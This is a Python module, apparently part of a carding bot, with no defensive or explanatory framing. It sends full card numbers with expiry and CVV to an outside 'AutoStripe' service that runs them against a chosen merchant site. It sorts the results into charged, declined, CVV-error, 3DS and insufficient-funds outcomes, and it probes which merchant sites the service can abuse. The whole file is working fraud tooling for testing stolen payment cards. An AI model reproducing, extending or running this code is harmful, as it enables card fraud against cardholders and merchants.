import json
import httpx
import asyncio

# AutoStripe API Configuration
AUTOSTRIPE_BASE_URL = "https://blackxcard-autostripe.onrender.com"
AUTOSTRIPE_GATEWAY = "autostripe"
AUTOSTRIPE_KEY = "Blackxcard"

def get_autostripe_site(user_id):
    """Get user's autostripe site from sites.json"""
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        return sites.get(str(user_id), {}).get("site")
    except Exception:
        return None

def get_autostripe_info(user_id):
    """Get user's full autostripe info including site and gate"""
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        return sites.get(str(user_id))
    except Exception:
        return None

async def check_autostripe(user_id, cc, site=None):
    """
    Check card using AutoStripe API
    Endpoint format: /gateway=autostripe/key=Blackxcard/site=example.com/cc=card|mm|yyyy|cvv
    """
    if not site:
        site = get_autostripe_site(user_id)
    if not site:
        return "Site Not Found"
    
    # Build the AutoStripe API URL
    url = f"{AUTOSTRIPE_BASE_URL}/gateway={AUTOSTRIPE_GATEWAY}/key={AUTOSTRIPE_KEY}/site={site}/cc={cc}"
    
    retries = 0
    while retries < 3:
        try:
            async with httpx.AsyncClient(timeout=120.0) as client:
                response = await client.get(url)
                
                # Try to parse JSON response
                try:
                    data = response.json()
                except:
                    data = {"Response": response.text}
                
                response_text = str(data.get("Response", data.get("response", data.get("message", str(data))))).upper()
                
                # Check for connection errors that warrant retry
                if any(err in response_text for err in [
                    "SERVER DISCONNECTED",
                    "CONNECTION ERROR",
                    "PEER CLOSED CONNECTION",
                    "INCOMPLETE CHUNKED READ"
                ]):
                    retries += 1
                    await asyncio.sleep(1)
                    continue
                
                break
                
        except httpx.ReadTimeout:
            return "Request Timeout"
        except httpx.ConnectError:
            retries += 1
            if retries >= 3:
                return "Connection Failed"
            await asyncio.sleep(1)
            continue
        except Exception as e:
            return f"Error: {str(e)}"
    
    if retries == 3:
        return "Connection Failed (Max Retries)"
    
    # Parse the response
    raw_response = data.get("Response", data.get("response", str(data)))
    
    # Determine status based on response keywords
    response_upper = str(raw_response).upper()
    
    if any(keyword in response_upper for keyword in ["CHARGED", "SUCCESS", "APPROVED", "ORDER_PLACED", "THANK YOU"]):
        return raw_response if raw_response else "CHARGED"
    elif "3DS" in response_upper or "3D_SECURE" in response_upper or "3D SECURE" in response_upper:
        return "3DS_REQUIRED"
    elif "CVV" in response_upper or "CVC" in response_upper:
        return raw_response if raw_response else "CVV_ERROR"
    elif any(keyword in response_upper for keyword in ["DECLINED", "REJECT", "FAILED", "INVALID"]):
        return raw_response if raw_response else "DECLINED"
    elif "INSUFFICIENT" in response_upper:
        return "INSUFFICIENT_FUNDS"
    elif "RATE LIMIT" in response_upper or "RATELIMIT" in response_upper:
        return "RATE_LIMITED"
    else:
        return raw_response if raw_response else "UNKNOWN_RESPONSE"

async def verify_autostripe_site(site, test_cc):
    """
    Verify if a site is supported by AutoStripe
    Returns dict with site info if supported, None otherwise
    """
    url = f"{AUTOSTRIPE_BASE_URL}/gateway={AUTOSTRIPE_GATEWAY}/key={AUTOSTRIPE_KEY}/site={site}/cc={test_cc}"
    
    try:
        async with httpx.AsyncClient(timeout=90.0) as client:
            response = await client.get(url)
            
            try:
                data = response.json()
            except:
                data = {"Response": response.text}
            
            # Check if site is supported (has valid response)
            response_text = str(data.get("Response", data.get("response", "")))
            
            # If we get a response (even declined), site is supported
            if response_text and "NOT SUPPORTED" not in response_text.upper() and "INVALID SITE" not in response_text.upper():
                return {
                    "supported": True,
                    "response": response_text,
                    "gateway": "AutoStripe",
                    "data": data
                }
            
            return None
            
    except Exception as e:
        return None
